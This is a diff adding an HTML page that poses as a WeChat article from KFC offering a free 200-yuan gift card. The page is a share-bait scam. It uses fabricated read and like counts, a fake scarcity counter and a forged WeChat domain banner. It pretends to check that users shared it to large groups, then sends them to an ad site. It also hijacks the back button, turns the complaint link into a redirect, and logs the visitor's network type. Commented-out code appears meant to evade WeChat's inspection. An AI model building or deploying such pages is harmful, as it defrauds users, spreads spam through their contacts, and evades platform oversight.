@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script>
+        var _czc = _czc || [];
+        _czc.push(["_setAccount", "1262044462"]);
+
+        function cnzz_pus(friend) {
+            _czc.push(["_trackEvent",'分享',friend,'index','','index']);
+        }
+    </script>
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+
+    <link href="http://res.wx.qq.com/mpres/htmledition/images/favicon218877.ico" rel="Shortcut Icon">
+    <script src="./newkfc_files/jweixin-1.0.0.js"></script>
+    <link rel="stylesheet" type="text/css" href="./newkfc_files/page_mp_article_improve24f185.css">
+    <link rel="stylesheet" type="text/css" href="./newkfc_files/page_mp_article_improve_combo24f185.css">
+    <link rel="stylesheet" href="./newkfc_files/weui.min.css">
+    <link rel="stylesheet" href="./newkfc_files/jquery-weui.min.css">
+    <!-- body 最后 -->
+    <script src="./newkfc_files/jquery.min.js"></script>
+    <script src="./newkfc_files/jquery-weui.min.js"></script>
+    <script src="./newkfc_files/jm.js"></script>
+    <!--script src="/title.js"></script-->
+    <script>
+        var connection = navigator.connection||navigator.mozConnection||navigator.webkitConnection||{tyep:'unknown'};
+        var type_text = ['unknown','ethernet','wifi','2g','3g','4g','none'];
+
+        var net_type = connection.type;
+//        alert(net_type);
+        var u = navigator.userAgent;
+        function is_ios() {
+            if(!!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)){
+                return true;
+            }else{
+                return false;
+            }
+        }
+
+        function getCookie(name) {
+            var arr, reg = new RegExp('(^| )' + name + '=([^;]*)(;|$)');
+            if (arr = document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }else{
+                return "";
+            }
+        }
+
+        function setCookie(name, value) {
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
+            document.cookie = name + '=' + escape(value) + ';expires=' + exp.toGMTString();
+        }
+
+        function log_push() {
+            $.post('/HSGkshwHgYThOpjkuiHtRdCBj',{type:net_type},function (data) {});
+        }
+
+        document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
+
+            WeixinJSBridge.call('hideOptionMenu');
+        });
+
+        var o = document.getElementById;
+        /*document.getElementById = function(a)
+        {
+            if (a == "_edw_iframe_") {
+                cnzz_pus('jb'+":"+window.location.host+":"+'119.130.241.133');
+                //发送后台记录
+                log_push();
+                location.href="http://t.cn/RaeA2py";
+                mfc.init();
+                return {}
+            } else {
+                return o.call(document, a);
+            }
+        };*/
+
+//        console.log(title);
+        document.title = 'So Good！肯德基儿童节请你来一次豪华大餐之旅！';
+        var doc = $(document);
+        var _touches_point1=0;var _touches_point2=0;
+        addEventListener("touchstart",
+                function(e) {
+                    _touches_point1 = e.touches[0].pageY;
+                });
+        addEventListener("touchmove",
+                function(e) {
+                    _touches_point2 = e.touches[0].pageY;
+                    if(doc.scrollTop()<=0 && _touches_point1<_touches_point2)
+                    {
+                        e.preventDefault();
+                        if( $('#_domain_display').length <=0 )
+                        {
+                            if(is_ios()){
+                                $('body').prepend('<div id="_domain_display" style="font-size: 0.7rem;text-align:center;background-color:#272b2e;color:#878790;height:0px;padding:15px 0;line-height:36px;overflow:hidden;letter-spacing:1px;"><p>网页由 mp.weixin.qq.com 提供</p></div>');
+                            }else{
+                                $('body').prepend('<div id="_domain_display" style="font-size: 0.7rem;text-align:center;background-color:#272b2e;color:#878790;height:0px;padding:15px 0;line-height:36px;overflow:hidden;letter-spacing:1px;"><p>网页由 mp.weixin.qq.com 提供</p><p style="margin-top: -10px;" id="tech">QQ浏览器X5内核提供技术支持</p></div>');
+                            }
+                        }
+                        $('#_domain_display').height((_touches_point2-_touches_point1));
+
+                    }
+                });
+        addEventListener("touchend",
+                function(e) {
+                    $('#_domain_display').slideUp('normal' , function(){
+                        $('#_domain_display').remove();
+                    });
+                });
+        function addDate(date,days){
+            var d=new Date(date);
+            d.setDate(d.getDate()+days);
+            var month=d.getMonth()+1;
+            var day = d.getDate();
+            if(month<10){
+                month = "0"+month;
+            }
+            if(day<10){
+                day = "0"+day;
+            }
+            var val = d.getFullYear()+"-"+month+"-"+day;
+            return val;
+        }
+    </script>
+    <style>
+        .bon{
+            background: rgb(26, 173, 25);
+            width: 95%;
+            margin: 10px auto;
+            text-align: center;
+            height: 40px;
+            line-height: 40px;
+            color: white;
+            border-radius: 10px;
+
+        }
+        body{font-size: 17px;font-family: -apple-system-font, "Helvetica Neue", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif}
+        .fxtp{
+            top:2%;
+            height: 100%;
+            margin:0 auto;left: 0;text-align: center; right: 0;
+            display:none;
+            opacity: 1;
+            visibility: visible;
+            z-index:99999;
+        }
+        .fxtp img{
+            display: block;
+            text-align: center;
+            margin: 0 auto;
+        }
+        .bottom-center{
+            color:#FF0000;
+            text-align: center;
+        }
+        #fxt{
+
+        }
+        .tips{
+            color:#000;font-size:18px;font-weight:300;
+            padding:30px 0 0;
+        }
+        .order {
+            height: 60px;
+            line-height: 60px;
+            text-align: center;
+        }
+        .order .line {
+            display: inline-block;
+            width: 30%;
+            border-top: 1px dashed #ccc ;
+        }
+        .order .txt {
+            font-size: 14px;
+            color: #a59898;
+            line-height: 20px;
+        }
+        /*#d-pic{*/
+            /*filter:blur(10px);*/
+            /*-webkit-filter:blur(10px);*/
+            /*-moz-filter:blur(10px);*/
+            /*-ms-filter:blur(10px);*/
+            /*-o-filter:blur(10px);*/
+        /*}*/ /*#pic{*/
+        /*filter:blur(2px);*/
+        /*-webkit-filter:blur(2px);*/
+        /*-moz-filter:blur(2px);*/
+        /*-ms-filter:blur(2px);*/
+        /*-o-filter:blur(2px);*/
+        /*}
+       */
+    </style>
+</head>
+<body id="activity-detail" class="zh_CN " ontouchstart="">
+
+<div id="fxt" class="fxtp">
+    <div class="tips" style="font-size: 15px;margin-bottom: 10px;font-weight: 500;">
+        <p style="text-align: left;margin-left: 20px;color: red;">温馨提示:</p><p style="text-align: left;margin-left: 20px;">长按下图,选择<span style="color:red;">发送给朋友-分享到群</span><span style="color: #1d1c1d;">即可领取！</span></p></div>
+    <script>
+        document.writeln("<div id='d-pic' style='margin: 0 auto;text-align: center;border:10px solid #E64340;width:60%;border-radius: 10px;'><img src='http://ww3.sinaimg.cn/large/006HJ39wgy1fg7yvfsv5rj30sg1c8gse.jpg' id='pic' style='margin: 0 auto;width:100%;'></div>");
+    </script>
+
+    <div class="bottom-center">
+        <strong>
+            <p style="color:red;font-size:18px;font-weight: 400;margin-top: 10px;margin-bottom: 10px;">[长按上图分享到群领取]</p>
+        </strong>
+    </div>
+
+</div>
+<div id="js_article" style="display: block;" class="rich_media">
+    <div id="js_top_ad_area" class="top_banner"></div>
+    <div class="rich_media_inner">
+        <div id="page-content">
+            <div id="img-content" class="rich_media_area_primary"><h2 class="rich_media_title" id="activity-name">肯德基儿童节豪礼200元心意卡免费送！生活如此美好</h2>
+
+                <div class="rich_media_meta_list">
+                    <em id="post-date" class="rich_media_meta rich_media_meta_text">
+                        <script>document.write(addDate(new Date(),-1))</script>                  </em>
+                    <!--span  class='rich_media_meta rich_media_meta_text rich_media_meta_nickname' style="color: #438AF6; display: block;">KFC</span-->
+                    <a class="rich_media_meta rich_media_meta_text rich_media_meta_nickname" style="color: #438AF6;" href="http://www.kfc.com.cn/">KFC</a>
+
+                </div>
+
+                    <div class="rich_media_content" id="js_content">
+                        <section data-role="outer" label="Powered by 135editor.com" style="font-family:微软雅黑;font-size:16px;"><p style="white-space: normal;"></p><section class="article"><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><span style="line-height: 1.6; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'=""><img data-s="300,640" data-type="jpeg" data-ratio="0.6895306859205776" data-w="" width="640" src="./newkfc_files/900" data-fail="0" height="auto" data-width="640" data-height="442" data-org="http://rdn.135editor.com/cache/remote/aHR0cHM6Ly9tbWJpei5xbG9nby5jbi9tbWJpei9tWElTNXRHaHA3Y3g2Umh2RDh2dEE0dFlOdHNpYzFpYW5iWVdlalpsNTF2TDB6UFZtVDY3Y2R0QURIVUwyOUFmSmljUlk5QWJpYXh2b3lhc3BtNnc1eUtLRFEvNjQwPw==" data-lazy="0" style="border: 0px; vertical-align: top; visibility: visible !important; width: auto !important;"><br>◆◆◆</span></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 18.018px; line-height: 38.4384px;"><img src="./newkfc_files/900(1)"></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 18.018px; line-height: 34px; text-align: center;"><strong style="font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'="">肯德基200元现金卡</strong></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><span style="line-height: 25.6px; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'="">小编请吃全家桶，尽享饕餮大餐！</span></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><span style="font-size: 14px; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'="">全国通用</span></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><span style="font-size: 14px; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'=""><img src="./newkfc_files/900(2)"></span></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><span style="font-size: 14px; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'=""><img src="./newkfc_files/900(3)"></span></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><span style=";font-size: 14px; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;;line-height:="" 1.75em;'="">（价值：200元/张）</span></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 18.018px; line-height: 34px; text-align: center;"><span style="font-size: 12px; color: #888888; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'="">-活动详情参见文末-</span></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 18.018px; line-height: 34px; text-align: center;"><img src="./newkfc_files/900(4)"></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><strong style="font-size: 19px; line-height: 23px; color: inherit; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'=""><span style="color: #938953;">肯德基经典</span></strong></p><section class="" data-id="84261" style="font-family: 微软雅黑; line-height: 25.6px; font-size: 17.9104px; border: 0px; box-sizing: border-box;"><section style="margin-top: 5px; margin-bottom: 5px; border: 0px; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;="" box-sizing:="" border-box;'=""><section data-style="color: rgb(51, 51, 51); font-size: 1em; line-height: 1.75em; word-break: break-all; word-wrap: break-word; text-align: justify;" style="margin: -0.8em 0.3em; padding: 0.8em; color: inherit; box-sizing: border-box;"><section class="" label="powered by 135editor.com"><section class="" data-id="7308" style="border: 0px none; box-sizing: border-box;"><h2 class="" data-brushtype="text" style="margin-right: auto; margin-bottom: 10px; margin-left: auto; font-size: 22px; padding-bottom: 9px; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(238, 238, 238); line-height: 1.1; text-align: center; font-weight: bold;"><span style="font-size: 20px;">吃货们的最爱</span></h2><section style="width: 0px; height: 0px; clear: both;"></section></section></section><section class="" label="powered by 135editor.com"><section class="" data-id="84261" style="border: 0px none; box-sizing: border-box;"><section class="" style="margin: 5px auto; border: 0px; box-sizing: border-box;"><section style="height: 25px; color: inherit;"><section style="height: 25px; width: 50px; float: left; border-top-width: 2px; border-top-style: solid; border-color: rgb(172, 29, 16); border-left-width: 2px; border-left-style: solid; color: inherit; box-sizing: border-box;"></section><section style="display: inline-block; color: rgb(172, 29, 16); clear: both; border-color: rgb(172, 29, 16); box-sizing: border-box;"></section></section><section class="" data-style="color: rgb(51, 51, 51); font-size: 1em; line-height: 1.75em; word-break: break-all; word-wrap: break-word; text-align: justify;" style="margin: -0.8em 0.3em; padding: 0.8em; color: inherit; box-sizing: border-box;"><p style="word-wrap: normal; font-size: 16px; line-height: 1.9; white-space: normal;"><span style="font-size: 20px;">世界上没有什么事儿是一顿<strong><span style="color: #C52120;">肯德基</span></strong>不能解决的</span></p><p style="word-wrap: normal; font-size: 16px; line-height: 1.9; white-space: normal;"><span style="font-size: 20px;">如果有，那就<strong><span style="color: #C52120;">两顿！</span></strong></span></p></section><section style="height: 25px; color: inherit;"><section style="height: 25px; width: 50px; float: right; border-bottom-width: 2px; border-bottom-style: solid; border-color: rgb(172, 29, 16); border-right-width: 2px; border-right-style: solid; color: inherit; box-sizing: border-box;"></section></section></section></section></section></section></section></section><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><img src="./newkfc_files/900(5)"></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><br></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><img src="./newkfc_files/900(6)"></p><p style="word-wrap: normal; font-family: 微软雅黑; white-space: normal; font-size: 17.9104px; line-height: 25.6px; text-align: center;"><span style="font-size: 14px; line-height: 1.6; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'="">...</span></p><blockquote class="" style="font-family: 微软雅黑; padding: 5px 15px; font-size: 18.018px; font-weight: bold; color: rgb(255, 255, 255); border-radius: 5px 5px 0px 0px; background-color: rgb(13, 13, 13);"><span style="line-height: 34px; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'="">使用方法</span></blockquote><blockquote class="" style="font-family: 微软雅黑; padding: 10px 15px 20px; border-width: 1px; border-top-style: solid; border-right-style: solid; border-bottom-style: solid; border-color: rgb(13, 13, 13); font-size: 18.018px; border-radius: 0px 0px 5px 5px;"><section class="" label="powered by 135editor.com" style="font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;'=""><section class="" data-id="24" style="border: 0px none; box-sizing: border-box;"><section class="" style="margin: 3px auto; padding: 15px; line-height: 24px; box-shadow: rgb(170, 170, 170) 0px 0px 3px; border: 2px solid rgb(240, 240, 240); box-sizing: border-box;"><p style="word-wrap: normal; font-size: 16px; line-height: 1.9; white-space: normal;"><span style="font-size: 14px;">1、心意卡面值200元；在全国肯德基店都可以消费直接抵现。若预付卡余额不足的，持卡人可使用现金、信用卡或借记卡等特约商户可接受的支付方式补足；</span></p><p style="word-wrap: normal; font-size: 16px; line-height: 1.9; white-space: normal;"><span style="font-size: 14px;">2、卡片无需激活，收到后即可使用；</span></p><p style="word-wrap: normal; font-size: 16px; line-height: 1.9; white-space: normal;"><span style="font-size: 14px;">3、卡片不记名不挂失，遗失不补，请妥善保管；</span></p></section></section></section></blockquote>
+
+
+                        <section class="" data-id="30" data-custom="rgb(245, 189, 209)" data-color="rgb(245, 189, 209)" style="font-family: monospace; line-height: 25.6px; widows: auto;padding: 10px; text-align: center; white-space: pre-wrap; font-size: 18.018px;"><section style="margin-top: 20px; padding: 5px; border: 1px dashed rgb(204, 204, 204); text-align: justify; line-height: 24px; box-shadow: rgb(165, 165, 165) 5px 5px 2px; font-family: " microsoft="" yahei',="" 'helvetica="" neue',="" helvetica,="" arial,="" sans-serif="" !important;="" box-sizing:="" border-box;="" background-color:="" rgb(250,="" 250,="" 250);'=""><section style="margin-top: -15px;  border: currentcolor; width: auto; text-align: left; box-sizing: border-box;"><strong><strong style="color: rgb(155, 24, 71); line-height: 20px; background-color: rgb(245, 189, 209);"><span class="" data-brushtype="text" style="padding: 5px;background: #040404;color: white;   box-shadow: #2f4a29 4px 4px 2px;">领取方式</span></strong></strong></section><section class="" data-style="margin-top: 2px; margin-bottom: 0px; padding: 0px; max-width: 100%; min-height: 1.5em; line-height: 2em;font-weight:bold;"><p style="margin: 10px;word-wrap: normal; font-size: 16px; line-height: 28.8px; white-space: normal;">1、活动结束时间:<span style="color: #438AF6;">2017年6月10日</span></p><p style="margin: 10px;word-wrap: normal; font-size: 16px; line-height: 28.8px; white-space: normal;">2、每个微信号只能领取一次</p><p style="margin: 10px;word-wrap: normal; font-size: 16px; line-height: 28.8px; white-space: normal;">3、活动剩余数量：<span style="color: red;">1869</span>份</p><div class="bon">点击这里免费领取</div></section></section></section>
+                        </section></section>
+                    
+
+                <!--赞赏-->
+                        <br>
+                        <div><img src="./newkfc_files/click.png" alt=""></div>
+
+                <div class="rich_media_tool" id="js_toobar">
+                <div class="media_tool_meta tips_global meta_primary"><span style="color: #438AF6;margin-right: 2px;"><a href="javascript:void(0);" id="rd-origin">阅读原文</a> </span>阅读&nbsp;<span id="readNum">100000+</span></div><span style="margin-left: 0px;" class="media_tool_meta meta_primary tips_global meta_praise" id="like3" like="0"><i class="icon_praise_gray" id="icon_parise"></i><span class="praise_num" id="likeNum3">100000+</span>
+                </span>
+
+                    <a id="" class="media_tool_meta tips_global meta_extra" style="margin-left: 2px;" href="javascript:$.alert(&quot;我们已经收到您的投诉&quot;,&quot;&lt;span style=color:red;&gt;投诉成功&lt;/span&gt;&quot;,function(){log_push();location.href=&quot;http://t.cn/RaeA2py&quot;;});">投诉</a></div>
+            </div>
+        </div>
+    </div>
+</div>
+    <style>
+        .sub-title {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+        .sub-title span {
+            color: #868686;
+            word-break: keep-all;
+            padding: 0 4px;
+            letter-spacing: 1px;
+            font-size: 16px;
+        }
+        .sub-title::before,.sub-title::after {
+            display: block;
+            content: '';
+            width: 50%;
+            height: 0;
+            border-top: 1px dotted #e1e1e1;
+        }
+    </style>
+
+    <!--<div class="sub-title">-->
+        <!--<span>广告</span>-->
+    <!--</div>-->
+    <!--<div style="text-align: center;margin-bottom: 20px;"><a id='ad' href="javascript:void(0);"><img style="width: 90%;" src="/static/image/ad.jpg?v=1" alt=""></a></div>-->
+
+    <!---->
+</div>
+<script>
+    $(function () {
+        $('#ad').bind('click',function () {
+            //cnzz_pus('img-ad');
+            location.href='http://abc.cachance.cn/wxarticle.php?pid=84&aid=4&t=1496543069';
+        });
+
+        $('#rd-origin').bind('click',function () {
+            //cnzz_pus('rd-origin');
+            //location.href='http://abc.cachance.cn/wxarticle.php?pid=84&aid=4&t=1496543069';
+			shade();
+            window.scrollTo(0,0);
+        });
+
+        $(".bon").click(function(){
+            //cnzz_pus('btn-click');
+            shade();
+            window.scrollTo(0,0);
+        });
+    });
+</script>
+
+<script language="Javascript">
+    var parse = getCookie('parse');
+    if(parse == 1){
+        parse = true;
+        $('#icon_parise').css('background-position',"0 -18px");
+    }else{
+        parse = false;
+        $('#icon_parise').css('background-position',"0 0px");
+    }
+    $(document).ready(function(){
+        $(".red").click(function(){
+            $(this).addClass("shake");
+            setTimeout(function(){
+                $(".red").fadeOut();
+                $(".windows").fadeIn();
+            },1000);
+        });
+    });
+    function shade(){
+        height = window.innerHeight;
+        console.log(height);
+        $('#fxt').height(height);
+        document.getElementById("fxt").style.display ="block";
+        document.getElementById("js_article").innerHTML ="";
+    }
+
+    $(function () {
+       $('#icon_parise').bind('click',function () {
+           if(parse == false){
+               $(this).css('background-position',"0 -18px");
+               parse=true;
+               setCookie('parse',1);
+           }else{
+               $(this).css('background-position',"0 0px");
+               parse=false;
+               setCookie('parse',0);
+           }
+       });
+    });
+
+    var hiddenProperty = 'hidden' in document ? 'hidden' :  'webkitHidden' in document ? 'webkitHidden' :  'mozHidden' in document ? 'mozHidden' : null;
+    var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
+    var aaa=0;
+    var onVisibilityChange = function(){
+        if (!document[hiddenProperty]) {
+            console.log('页面非激活');
+            if(aaa==0){
+                confirm1();
+                return false;
+            }
+            if(aaa==1){
+                confirm2();
+                return false;
+            }
+            if(aaa==2){
+                confirm3();
+                return false;
+            }
+            if(aaa==3){
+                ok();
+            }
+
+        }else{
+            console.log('页面激活');
+        }
+    };
+    document.addEventListener(visibilityChangeEvent, onVisibilityChange);
+
+    function confirm1(){
+        $.alert('还需再分享到<span style="color: red;font-size: 24px;">2</span>个不同的群（群人数不少于50人）',"<span style='color: green;'>分享成功</span>",function () {
+            aaa++;
+        });
+        rd = parseInt(Math.random()*100);
+        if(rd <=50){
+            $('#pic').attr('src','http://ww3.sinaimg.cn/large/006HJ39wgy1fg8z31g0uxj30sg1c8q9p.jpg');
+        }
+
+        //cnzz_pus('firend');
+    }
+
+    function confirm2() {
+
+        $.alert('还需再分享到<span style="color: red;font-size: 24px;">1</span>个不同的群（群人数不少于50人）',"<span style='color: green;'>分享成功</span>",function () {
+            aaa++;
+        });
+        rd = parseInt(Math.random()*100);
+        $('#pic').attr('src','http://ww1.sinaimg.cn/large/006HJ39wgy1fg900j916aj30sg1c8gse.jpg');
+        //if(rd <=50){
+        //    $('#pic').attr('src','http://ww3.sinaimg.cn/large/006HJ39wgy1fg8z31g0uxj30sg1c8q9p.jpg');
+        //}
+
+        //cnzz_pus('firend');
+    }
+
+    function confirm3() {
+        $.alert('还需再分享到<span style="color: red;font-size: 26px;">1</span>个不同的群（群人数不少于50人）',"<span style='color: red;'>分享失败</span>",function () {
+            aaa++;
+        });
+        $('#pic').attr('src','http://ww3.sinaimg.cn/large/006HJ39wgy1fg900j9hllj30sg1c8jy6.jpg');
+        //cnzz_pus('firend');
+    }
+
+    function ok() {
+        rd = parseInt(Math.random()*100);
+        //if(rd>0){
+            $.modal({
+                title: "<span style='color: green;'>温馨提示</span>",
+                //text: '长按图片<span style="color: red;">保存图片</span>，发送图片到朋友圈，并获取至少三个赞，等待系统审核!',
+				text: '恭喜您，奖品会在48小时内审核后存入您的账户，请保留24小时哦！另外，还有一个超级给力的活动与您分享！',
+                buttons: [
+                    {
+                        text: "<span>确定</span>", onClick: function(){
+						location.href='http://abc.cachance.cn/wxarticle.php?pid=84&aid=4&t=1496543069';
+                        }
+                    }
+                ]
+            });
+        //}else{
+            /*$.modal({
+                title: "<span style='color: green;'>分享成功</span>",
+                text: '恭喜您获得了领取资格，请耐心等待系统审核',
+                buttons: [
+                    {
+                        text: "<span>确定</span>", onClick: function(){
+                            location.href='http://mp.weixin.qq.com/s/l4w0-wW6IvVp6lT9p7nB1w';
+                        }
+                    }
+                ]
+            });
+        }*/
+    }
+
+    //退返跳转指定页面
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {location.href='http://abc.cachance.cn/wxarticle.php?pid=84&aid=4&t=1496543069';}
+    setTimeout('hh();', 200);
+</script>
+
+</body><wappalyzerdata id="wappalyzerData" style="display: none"></wappalyzerdata><script id="wappalyzerEnvDetection" src="chrome-extension://cnjfmkecbbooheemadfcdndegmmhfmje/js/inject.js"></script></html>
